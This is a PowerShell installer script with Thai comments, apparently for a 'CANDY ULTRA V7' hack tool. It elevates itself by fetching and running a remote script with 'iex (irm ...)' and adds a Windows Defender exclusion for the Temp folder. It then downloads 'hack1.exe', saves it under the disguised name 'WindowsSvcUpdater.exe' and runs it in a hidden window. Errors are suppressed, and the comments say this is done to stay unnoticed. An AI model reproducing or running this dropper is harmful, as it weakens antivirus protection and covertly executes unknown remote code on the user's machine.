# 1. [Self-Elevation] ขอสิทธิ์ Administrator อัตโนมัติ
# *** ก๊อปปี้ RAW Link ของไฟล์ install.ps1 บน GitHub มาใส่ตรงนี้ ***
$scriptUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/install.ps1"

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm '$scriptUrl')`"" -Verb RunAs
    exit
}

# 2. [Security] ปิดการสแกนในโฟลเดอร์ Temp เพื่อความลื่นไหล
Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue

# 3. [Configuration] ข้อมูลไฟล์และหน้าควบคุม
$exeUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/hack1.exe"
$savePath = "$env:TEMP\WindowsSvcUpdater.exe"
$dashboardUrl = "https://creative-bombolone-1e0912.netlify.app/"

# 4. [Execution] เริ่มการติดตั้งและรันเงียบๆ
try {
    # ดาวน์โหลด Engine
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $exeUrl -OutFile $savePath -UseBasicParsing
    
    # รัน Engine แบบซ่อนหน้าต่างดำ (Silent Mode)
    Start-Process $savePath -WindowStyle Hidden
    
    # เปิดหน้า Dashboard บน Netlify เพื่อเริ่มคุมค่า
    Start-Process $dashboardUrl
    
    Write-Host "[+] CANDY ULTRA V7: System Synced." -ForegroundColor Green
}
catch {
    # ไม่แสดง Error ให้คนใช้เห็นเพื่อความเนียน
}
